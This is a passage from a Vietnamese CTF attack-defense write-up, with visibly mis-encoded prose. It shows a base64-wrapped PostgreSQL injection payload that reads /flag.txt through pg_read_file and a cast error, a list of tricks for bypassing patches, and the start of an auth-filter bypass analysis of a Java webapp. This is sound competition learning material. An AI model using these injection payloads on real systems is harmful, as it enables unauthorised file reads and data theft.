&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;it_db=# select sdecode(convert_from(decode(&amp;#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCgoc2VsZWN0IHBnX3JlYWRfZmlsZSgnL2ZsYWcudHh0JykpIGFzIG51bWVyaWMpLS0=&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ERROR: invalid input syntax for type numeric: &amp;#34;CSCV2025{fake_flag_for_testing}&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CONTEXT: SQL statement &amp;#34;SELECT convert_from(decode(&amp;#39;QQ==&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;)||cast((select pg_read_file(&amp;#39;/flag.txt&amp;#39;)) as numeric)--&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;UTF8&amp;#39;)&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PL/pgSQL function sdecode(text) line 7 at EXECUTE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ¬nh solve khÃ¡ muá»™n, váº«n sau 2 team nÃªn sau khi ra flag á»Ÿ challenge pháº£i giÃ nh giáº­t submit máº¥y round má»›i Äƒn Ä‘Æ°á»£c 1 round:
&lt;img src="https://hackmd.io/_uploads/Sk0M-W_ebl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¡c round Ä‘áº§u thÃ¬ cÃ¡c váº«n chÆ°a cÃ³ patch nÃ o, cho Ä‘áº¿n khi mÃ¬nh nhÃ¬n máº·t Ä‘Æ°á»£c payload vÃ  báº¯t Ä‘áº§u patch chuáº©n chá»‰ thÃ¬ bá»‹ 1 team unshield xong Ä‘á»›p cÃ¡i patch. ThÃ nh ra giá» mÃ¬nh pháº£i bypass cÃ¡i patch cá»§a chÃ­nh mÃ¬nh, hoáº·c lÃ  Ä‘i tÃ¬m bug khÃ¡c.
Trong lÃºc submit, mÃ¬nh vÃ  team mÃ¬nh liÃªn tá»¥c submit cháº­m hÆ¡n cÃ¡c team khÃ¡c khÃ´ng chá»‰ á»Ÿ category web mÃ  cÃ²n á»Ÿ cÃ¡c chall pwn. LÃºc thÃ¬ bá»‹ rate limit, lÃºc thÃ¬ &lt;code&gt;owner already updated!!!&lt;/code&gt; tá»©c Ä‘Ã£ cÃ³ team khÃ¡c submit rá»“i, cháº§y cháº­t mÃ£i má»›i cÃ³ thá»ƒ giÃ nh láº¡i Ä‘Æ°á»£c thÃ¬ cÅ©ng khÃ´ng tá»“n táº¡i Ä‘Æ°á»£c quÃ¡ 1 2 round. Team mÃ¬nh khÃ¡ cay vÃ  pháº£i liÃªn tá»¥c sá»­a script, thÃªm sleep Ä‘á»ƒ khÃ´ng bá»‹ ratelimit nhÆ°ng váº«n khÃ´ng Äƒn thua ğŸ—¿
Vá» sau, cÃ³ má»™t sá»‘ cÃ¡ch patch mÃ  teammate mÃ¬nh Ä‘Ã£ bypass nhÆ°:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/**/&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;&amp;#39; and vÃ  &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;||(payload)||&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;convert&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;encode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;&amp;#39;string&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;$$&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;$$&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$$&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;$$&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ref: &lt;a class="link" href="https://hackmd.io/@Chivato/rkHvEMHUI" target="_blank" rel="noopener"
&gt;https://hackmd.io/@Chivato/rkHvEMHUI&lt;/a&gt;
Táº¡i nhá»¯ng round cuá»‘i, khi báº£n patch Ä‘Ã£ khÃ¡ cháº·t thÃ¬ chá»‰ cÃ²n team mÃ¬nh vÃ  1 team khÃ¡c cÃ³ thá»ƒ bypass patch nÃªn 2 anh em cá»© chia nhau má»—i ngÆ°á»i 1 round. VÃ¬ mÃ¬nh khÃ´ng biáº¿t payload cá»§a há», cÅ©ng nhÆ° khÃ´ng muá»‘n Ä‘á»ƒ lá»™ payload cá»§a báº£n thÃ¢n nÃªn mÃ¬nh Ä‘Ã£ chá»n sá»­ dá»¥ng láº¡i báº£n patch mÃ  chá»‰ 2 Ä‘á»™i cÃ³ thá»ƒ bypass Ä‘Æ°á»£c, khÃ¡ cá»“ng ká»nh. VÃ  Ä‘áº¿n gáº§n káº¿t thÃºc cuá»™c thi (cháº¯c cÃ²n 3 round), mÃ¬nh má»›i hÆ¡i lá» má» tÃ¬m Ä‘Æ°á»£c Ä‘Æ°á»ng Ä‘á»ƒ exploit vuln thá»© 2.&lt;/p&gt;
&lt;h3 id="bypass-auth-to-ssti"&gt;Bypass Auth to SSTI
&lt;/h3&gt;&lt;h4 id="bypass-authen"&gt;Bypass Authen
&lt;/h4&gt;&lt;p&gt;Äá»ƒ phÃ¢n tÃ­ch Ä‘Æ°á»£c vuln nÃ y thÃ¬ mÃ¬nh báº¯t buá»™c cáº§n pháº£i setup debug, mÃ¬nh ote láº¡i má»™t vÃ i bÆ°á»›c nhÆ° sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chá»‰nh láº¡i Dockerfile cá»§a tomcat&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;EXPOSE 5005
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Bá» service nginx Ä‘á»ƒ vÃ o tháº³ng tomcat cho tiá»‡n, Ä‘á»“ng thá»i expose port 5005 ra ngoÃ i&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;web:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;container_name: web
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;build:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; context: .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; dockerfile: web/Dockerfile
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - ./flag.txt:/flag.txt:ro
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;restart: unless-stopped
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - &amp;#34;8080:8080&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - &amp;#34;5005:5005&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;depends_on:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - postgres
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - internet
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - no-internet
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Khi Ä‘Ã£ tháº¥y remote debug connected mÃ  Ä‘áº·t breakpoint khÃ´ng Äƒn thÃ¬ cÃ³ thá»ƒ lÃ  do chÆ°a chá»n class lÃ  code base, Ä‘á»ƒ set thÃ¬ mÃ¬nh vÃ o Project Structure. Táº¡i tab Modules chá»n pháº§n Dependencies, thÃªm folder classes vÃ o vá»›i option lÃ  JARs or Directories lÃ  oke:&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/HktCoGueWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Trong web.xml khai bÃ¡o cÃ¡c file truy cáº­p tá»« Ä‘Æ°á»ng dáº«n &lt;code&gt;/admin&lt;/code&gt; Ä‘á»u sáº½ Ä‘i qua 2 class AuthFilter vÃ  WafFilter:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;filter-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;filter-name&amp;gt;AuthFilter&amp;lt;/filter-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;url-pattern&amp;gt;/admin/*&amp;lt;/url-pattern&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/filter-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;filter-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;filter-name&amp;gt;WafFilter&amp;lt;/filter-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;url-pattern&amp;gt;/admin/*&amp;lt;/url-pattern&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/filter-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Class AuthFilter yÃªu cáº§u má»—i request Ä‘i vÃ o Ä‘á»u cÃ³ username vÃ  password, biáº¿n format lÃ  cÃ¡ch thá»©c hash máº­t kháº©u Ä‘á»ƒ so khá»›p, náº¿u khÃ´ng cÃ³ máº·c Ä‘á»‹nh lÃ  sha1:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByXK6zuxZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u nhÆ° format Ä‘Æ°á»£c truyá»n vÃ o thÃ¬ pháº£i náº±m trong &lt;code&gt;sha1,md5,sha256,sha512&lt;/code&gt;, náº¿u khÃ´ng sáº½ bÃ¡o lá»—i ngay:
&lt;img src="https://hackmd.io/_uploads/B19i6fdeZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Check chÃ¡n chÃª r má»›i Ä‘áº¿n Ä‘oáº¡n check thÃ´ng tin ngÆ°á»i dÃ¹ng táº¡i InMemoryUserDB#verifyUser:
&lt;img src="https://hackmd.io/_uploads/Syje0G_lZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m nÃ y check username trÆ°á»›c báº±ng cÃ¡ch láº¥y password cá»§a user tÆ°Æ¡ng á»©ng. Sau Ä‘Ã³ so khá»›p máº­t kháº©u lÆ°u trá»¯ vá»›i máº­t kháº©u truyá»n vÃ o Ä‘Æ°á»£c hash báº±ng format ta Ä‘iá»u chá»‰nh. Äá»“ng thá»i this.users lÃ  má»™t map chá»©a má»—i admin, nÃªn loáº¡i bá» viá»‡c crack hash:
&lt;img src="https://hackmd.io/_uploads/ByvU0MdeWx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Qua 1 vÃ²ng if, tiáº¿p tá»¥c kiá»ƒm tra thuá»™c tÃ­nh protect lÃ  true thÃ¬ kiá»ƒm tra role, khÃ´ng pháº£i admin thÃ¬ tráº£ vá» lá»—i role, cuá»‘i cÃ¹ng náº¿u dpFilter lÃ  true thÃ¬ má»›i tiáº¿p tá»¥c xá»­ lÃ½:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rknUWmOx-l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;Thuá»™c tÃ­nh protect Ä‘Æ°á»£c set báº±ng logic sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Láº¥y URI cá»§a request, split tá»«ng thÆ° má»¥c theo dáº¥u &amp;ldquo;/&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Set page_type máº·c Ä‘á»‹nh rá»—ng, náº¿u nhÆ° tÃªn file cÃ³ nhiá»u hÆ¡n 2 dáº¥u . thÃ¬ láº¥y extension sau dáº¥u cháº¥m cuá»‘i cÃ¹ng&lt;/li&gt;
&lt;li&gt;Check náº¿u page_type náº±m trong protectedPages thÃ¬ set lÃ  true, khÃ´ng thÃ¬ lÃ  false
Máº·c Ä‘á»‹nh truyá»n vÃ o file thÃ´ng thÆ°á»ng nhÆ°: /admin/index.tpl thÃ¬ máº·c Ä‘á»‹nh page_type lÃ  &amp;quot;&amp;quot; =&amp;gt; chuá»—i nÃ o mÃ  cháº£ contains &amp;quot;&amp;quot; nÃªn máº·c Ä‘á»‹nh protect lÃ  true:
&lt;img src="https://hackmd.io/_uploads/SJXgZXOx-l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÆ° váº­y, Ä‘á»ƒ bypass auth thÃ¬ pháº£i khÃ´ng Ä‘Æ°á»£c Ä‘á»ƒ doFilter lÃ  false, Ä‘á»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³ thÃ¬:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Bypass verifyUser&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Debug ká»¹ hÆ¡n, ta tháº¥y vÃ²ng if Ä‘áº§u cÃ³ block try/catch, mÃ  náº¿u nhÆ° rÆ¡i vÃ o catch thÃ¬ doFilter sáº½ khÃ´ng bá»‹ set thÃ nh false:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getParameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;format&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isEmpty&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;format&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;sha1&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;sha1,md5,sha256,sha512&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;format does not support&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;doFilter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendRedirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/home/_error.page?errorMsg=&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;URLEncoder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;StandardCharsets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF_8&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;boolean&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;userDB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;verifyUser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;auth failed1!&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;doFilter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
